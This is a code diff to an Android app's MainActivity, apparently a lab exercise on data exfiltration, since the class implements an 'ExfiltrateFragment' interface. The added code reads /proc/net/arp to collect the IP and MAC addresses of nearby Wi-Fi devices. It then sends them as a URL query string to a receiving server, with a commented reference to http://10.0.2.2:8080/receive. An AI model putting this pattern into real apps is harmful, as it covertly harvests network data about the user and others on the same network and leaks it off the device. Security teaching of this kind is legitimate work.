@@ -11,13 +11,19 @@ import androidx.appcompat.view.menu.MenuBuilder;
 import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 import androidx.recyclerview.widget.ItemTouchHelper;
+
+import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
 import android.widget.RelativeLayout;
 import android.widget.Toast;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
+import java.io.IOException;
 import java.io.UnsupportedEncodingException;
 import java.net.URLEncoder;
 import java.util.ArrayList;
@@ -205,9 +211,67 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
      */
     public void addItem(View view) {
         // TODO
-        mItemsData.add(new Item("EXAMPLE", "EXAMPLE"));
+        // -----------------------------
+        try {
+            BufferedReader br = new BufferedReader(new FileReader("/proc/net/arp"));
+            String line;
+            br.readLine();
+
+            while ((line = br.readLine()) != null) {
+                String[] parts = line.split("\\s+");
+                if (parts.length >= 6) {
+                    String ipAddress = parts[0];
+                    String hwType    = parts[1];
+                    String flags     = parts[2];
+                    String macAddress = parts[3];
+                    String mask      = parts[4];
+                    String deviceInterface = parts[5];
+
+                    Log.d("ARPEntry", "IP: " + ipAddress +
+                            ", HW Type: " + hwType +
+                            ", Flags: " + flags +
+                            ", MAC: " + macAddress +
+                            ", Mask: " + mask +
+                            ", Interface: " + deviceInterface);
+
+                    // Only entries for wireless interfaces
+                    if (deviceInterface.contains("wlan")) {
+                        String mac = "MAC: " + macAddress;
+                        String ipInfo = "IP: " + ipAddress;
+                        Item item = new Item(ipInfo, mac);
+
+                        // No duplicates
+                        boolean isDuplicate = false;
+                        for (Item i : mItemsData) {
+                            if (i.getTitle().equals(ipInfo) && i.getInfo().equals(mac)) {
+                                isDuplicate = true;
+                                break;
+                            }
+                        }
+
+                        if (!isDuplicate)
+                            mItemsData.add(item);
+                    }
+                }
+            }
+            br.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+            // Add error info
+            mItemsData.add(new Item("Error reading ARP", e.getMessage()));
+        }
+
+        if (mItemsData.isEmpty()) {
+            mItemsData.add(new Item("No data found", ""));
+        }
+
         mAdapter.notifyDataSetChanged();
         updateEmptyMessageVisibility();
+
+
+        /*
+        onYes("http://10.0.2.2:8080/receive");
+        */
     }
 
     /**
@@ -218,6 +282,30 @@ public class MainActivity extends AppCompatActivity implements ExfiltrateFragmen
     @Override
     public void onYes(String url) {
         // TODO
+
+        /*
+        String serverUrl = "http://10.0.2.2:8080/receive";
+         */
+        try {
+            StringBuilder combinedData = new StringBuilder();
+            combinedData.append("\n");
+            for (Item item : mItemsData) {
+                String data = item.getTitle() + " | " + item.getInfo();
+                combinedData.append(data).append("\n");
+            }
+
+            String dataToSend = combinedData.toString();
+            String encodedData = Uri.encode(dataToSend);
+            String fullUrl = url + "?data=" + encodedData;
+
+            Intent intent = new Intent(Intent.ACTION_VIEW);
+            intent.setData(Uri.parse(fullUrl));
+            startActivity(intent);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Failed to send data", Toast.LENGTH_SHORT).show();
+        }
     }
 
     /**
